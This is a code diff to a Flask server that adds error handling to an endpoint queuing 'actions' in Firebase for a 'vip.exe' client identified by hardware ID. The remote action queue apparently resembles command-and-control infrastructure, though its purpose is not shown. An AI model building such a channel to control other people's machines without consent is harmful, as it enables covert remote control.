@@ -39,18 +39,21 @@ def heartbeat():
 
 @app.route('/api/target-action', methods=['POST'])
 def target_action():
-    data = request.json
-    hwid = data.get('hwid')
-    action = data.get('action')
+    try:
+        data = request.json
+        hwid = data.get('hwid')
+        action = data.get('action')
 
-    if not hwid or not action:
-        return jsonify({"message": "Invalid HWID or action."}), 400
+        if not hwid or not action:
+            return jsonify({"status": "error", "message": "Invalid HWID or action."}), 400
 
-    # I-save ang utos sa Firebase Realtime Database para makuha ng vip.exe client
-    ref = db.reference(f'clients/{hwid}/pending_action')
-    ref.set(action)
+        # Direktang i-save sa Firebase Realtime Database para makuha ng vip.exe
+        ref = db.reference(f'clients/{hwid}/pending_action')
+        ref.set(action)
 
-    return jsonify({"message": f"Action '{action}' queued for {hwid}!"})
+        return jsonify({"status": "success", "message": f"Action '{action}' successfully queued for {hwid}!"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
